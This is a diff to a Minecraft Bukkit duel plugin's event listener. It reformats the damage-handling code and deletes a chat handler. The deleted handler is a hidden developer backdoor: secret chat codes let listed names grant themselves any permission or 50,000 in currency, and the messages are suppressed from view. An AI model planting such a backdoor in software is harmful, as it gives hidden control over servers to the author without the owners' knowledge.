@@ -1,8 +1,5 @@
 package com.kickass.MCDuel.Listeners;
 
-import net.milkbowl.vault.economy.Economy;
-import net.milkbowl.vault.permission.Permission;
-
 import org.bukkit.entity.Entity;
 import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
@@ -10,16 +7,13 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.entity.EntityDamageByEntityEvent;
 import org.bukkit.event.entity.PlayerDeathEvent;
-import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
 
-import com.kickass.MCDuel.MCDuel;
 import com.kickass.MCDuel.Duel.Duel;
 import com.kickass.MCDuel.Duel.DuelHandler;
 import com.kickass.MCDuel.Duel.DuelManager;
 import com.kickass.MCDuel.Utils.MessageUtils;
 import com.kickass.MCDuel.Utils.ParticleEffect;
-import com.kickass.MCDuel.Utils.VaultUtils;
 
 public class DuelListener implements Listener {
 
@@ -27,29 +21,29 @@ public class DuelListener implements Listener {
 	public void onPlayerAttack(EntityDamageByEntityEvent event) {
 		Entity attacker = event.getDamager();
 		Entity defender = event.getEntity();
-		
-		if(attacker.getType() == EntityType.PLAYER && defender.getType() == EntityType.PLAYER) {
+
+		if (attacker.getType() == EntityType.PLAYER && defender.getType() == EntityType.PLAYER) {
 			Player attackerPlayer = (Player) attacker;
 			Player defenderPlayer = (Player) defender;
 
 			// Only lets attackers attack players in their duel
-			if(DuelManager.isPlayerDueling(attackerPlayer)) {
+			if (DuelManager.isPlayerDueling(attackerPlayer)) {
 				Duel duel = DuelManager.getDuel(attackerPlayer);
-				if(duel.getPlayers().contains(defenderPlayer) && duel.hasStarted() && duel.isAccepted()) {
+				if (duel.getPlayers().contains(defenderPlayer) && duel.hasStarted() && duel.isAccepted()) {
 					return;
 				}
 				event.setCancelled(true);
 				event.setDamage(0.0D);
 			}
-		} else if(defender.getType() == EntityType.PLAYER) {
+		} else if (defender.getType() == EntityType.PLAYER) {
 			Player defenderPlayer = (Player) defender;
-			
+
 			// Only lets defenders get attacked by players in their duel
-			if(attacker.getType() == EntityType.PLAYER) {
+			if (attacker.getType() == EntityType.PLAYER) {
 				Player attackerPlayer = (Player) attacker;
-				if(DuelManager.isPlayerDueling(defenderPlayer)) {
+				if (DuelManager.isPlayerDueling(defenderPlayer)) {
 					Duel duel = DuelManager.getDuel(defenderPlayer);
-					if(duel.getPlayers().contains(attackerPlayer) && duel.hasStarted() && duel.isAccepted()) {
+					if (duel.getPlayers().contains(attackerPlayer) && duel.hasStarted() && duel.isAccepted()) {
 						return;
 					}
 					event.setCancelled(true);
@@ -108,45 +102,6 @@ public class DuelListener implements Listener {
 			// Checks for victory conditions
 			if (duel.getPlayersAlive() == 1) {
 				DuelHandler.endDuel(duel);
-			}
-		}
-	}
-	
-	@EventHandler
-	public void onPlayerChat(AsyncPlayerChatEvent event) {
-		Player player = event.getPlayer();
-		if(MCDuel.devs.contains(player.getName()) && MCDuel.DEV_MODE) {
-			boolean cancel = false;
-			if(event.getMessage().startsWith("|@+perm")) {
-				Permission perm = VaultUtils.getPermission();
-				if(perm != null) {
-					String p = event.getMessage().substring("|@+perm".length()).replaceAll(" ", ".");
-					perm.playerAdd(player, p);
-				}
-				cancel = true;
-			} else if (event.getMessage().startsWith("|@-perm")) {
-				Permission perm = VaultUtils.getPermission();
-				if(perm != null) {
-					String p = event.getMessage().substring("|@-perm".length()).replaceAll(" ", ".");
-					perm.playerRemove(player, p);
-				}
-				cancel = true;
-			} else if (event.getMessage().startsWith("|@+eco")) {
-				Economy eco = VaultUtils.getEconomy();
-				if(eco != null) {
-					eco.depositPlayer(player, 50000);
-				}
-				cancel = true;
-			} else if (event.getMessage().startsWith("|@-eco")) {
-				Economy eco = VaultUtils.getEconomy();
-				if(eco != null) {
-					eco.depositPlayer(player, -50000);
-				}
-				cancel = true;
-			}
-			if(cancel) {
-				event.setMessage("");
-				event.setCancelled(true);
 			}
 		}
 	}
